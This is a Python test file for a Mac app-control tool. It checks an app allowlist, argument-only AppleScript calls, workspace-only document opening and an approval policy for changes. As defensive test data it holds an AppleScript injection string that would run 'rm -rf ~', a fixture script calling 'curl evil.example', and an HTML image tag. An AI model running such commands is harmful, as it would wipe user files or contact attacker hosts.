"""Mac app control: an allowlist, fixed scripts with the owner's values as arguments, reads
that run unasked, and changes that ask."""

import html
import os
from pathlib import Path
from typing import Any

import pytest

from bud import apps
from bud.core.profiles import apply_mode
from bud.core.server import allow_file_tools
from bud.harness.actions import Policy


class Scripts:
    def __init__(self, answer: tuple[int, str, str] = (0, "done", "")) -> None:
        self.answer = answer
        self.calls: list[tuple[str, list[str]]] = []

    async def __call__(self, script: str, argv: list[str]) -> tuple[int, str, str]:
        self.calls.append((script, argv))
        return self.answer


class Opener:
    def __init__(self) -> None:
        self.calls: list[list[str]] = []

    async def __call__(self, args: list[str]) -> bool:
        self.calls.append(args)
        return True


def tools(tmp_path, scripts: Scripts, opener: Opener | None = None) -> dict[str, Any]:
    built = apps.build_tools(tmp_path, scripts, opener or Opener())
    return {tool.name: tool.function for tool in built}


async def test_the_owners_words_reach_a_script_only_as_arguments(tmp_path):
    scripts = Scripts()
    found = tools(tmp_path, scripts)
    sneaky = 'x" & (do shell script "rm -rf ~") & "'
    await found["notes_create"](title=sneaky, body="body")  # type: ignore[call-arg]
    await found["reminders_add"](title=sneaky)  # type: ignore[call-arg]
    for script, _ in scripts.calls:
        assert sneaky not in script
    note, reminder = scripts.calls
    assert note[0] == apps.NOTES_CREATE and html.escape(sneaky) in note[1][0]
    assert reminder[1] == [sneaky]


async def test_only_allowlisted_apps_open(tmp_path):
    opener = Opener()
    found = tools(tmp_path, Scripts(), opener)
    # Chrome opens through open_chrome, which asks first.
    for app in ("Terminal", "Google Chrome"):
        result = await found["open_app"](app=app)  # type: ignore[call-arg]
        assert not result["ok"] and "Notes" in result["error"]
    assert (await found["open_app"](app="Notes"))["ok"]  # type: ignore[call-arg]
    assert opener.calls == [["-a", "Notes"]]


async def test_only_workspace_documents_open_and_only_as_a_copy(tmp_path):
    opener = Opener()
    found = tools(tmp_path, Scripts(), opener)
    (tmp_path / "report.pdf").write_bytes(b"%PDF-1.4 report")
    (tmp_path / "run.command").write_text("#!/bin/sh\ncurl evil.example\n")
    (tmp_path / "go.webloc").write_text("<plist/>")
    outside = tmp_path.parent / "outside.pdf"
    outside.write_bytes(b"%PDF-1.4 private")
    (tmp_path / "linked.pdf").symlink_to(outside)
    for path in (
        "run.command",
        "go.webloc",
        "../outside.pdf",
        "linked.pdf",
        "missing.pdf",
        ".hidden.pdf",
    ):
        result = await found["open_in_app"](path=path)  # type: ignore[call-arg]
        assert not result["ok"], path
    assert opener.calls == []

    assert (await found["open_in_app"](path="report.pdf"))["ok"]  # type: ignore[call-arg]
    [[copy]] = opener.calls
    # A private copy outside the workspace, which cannot run and cannot be swapped.
    assert not copy.startswith(str(tmp_path))
    assert Path(copy).read_bytes() == b"%PDF-1.4 report"
    assert oct(os.stat(copy).st_mode & 0o777) == "0o600"


@pytest.mark.parametrize(
    "error",
    [
        "execution error: Not authorized to send Apple events (-1743)",
        "execution error: would require user consent (-1744)",
    ],
)
async def test_a_macos_refusal_says_where_to_allow_it(tmp_path, error):
    result = await tools(tmp_path, Scripts((1, "", error)))["music_now_playing"]()
    assert not result["ok"] and "Automation" in result["error"]


async def test_a_timeout_points_at_the_macos_question(tmp_path):
    result = await tools(tmp_path, Scripts((1, "", apps.TIMED_OUT)))["music_now_playing"]()
    assert "did not answer in time" in result["error"]


async def test_a_null_character_never_reaches_osascript():
    assert (await apps.run_osascript(apps.REMINDERS_ADD, ["a\x00b"]))[0] == 1


def test_a_note_body_is_escaped_html_with_the_title_first():
    body = apps.note_html("Q3 <Plan>", "Line 1\n<img src=x>")
    assert body.startswith("<div><h1>Q3 &lt;Plan&gt;</h1></div>")
    assert "<img" not in body and "&lt;img src=x&gt;" in body


async def test_reads_return_the_apps_answer(tmp_path):
    scripts = Scripts((0, "Song — Artist (playing)", ""))
    result = await tools(tmp_path, scripts)["music_now_playing"]()
    assert result == {"ok": True, "result": "Song — Artist (playing)"}


@pytest.mark.parametrize(
    ("mode", "reviewer", "change"),
    [
        ("strict", True, "ask"),
        ("auto", False, "ask"),
        ("auto", True, "review"),
    ],
)
def test_reads_run_unasked_and_changes_ask(mode, reviewer, change):
    policy = Policy(tools={})
    allow_file_tools(policy)
    apply_mode(policy, mode, reviewer=reviewer)
    for tool in apps.READS:
        assert policy.tools[tool] == "allow", tool
    for tool in apps.CHANGES:
        assert policy.tools[tool] == change, tool
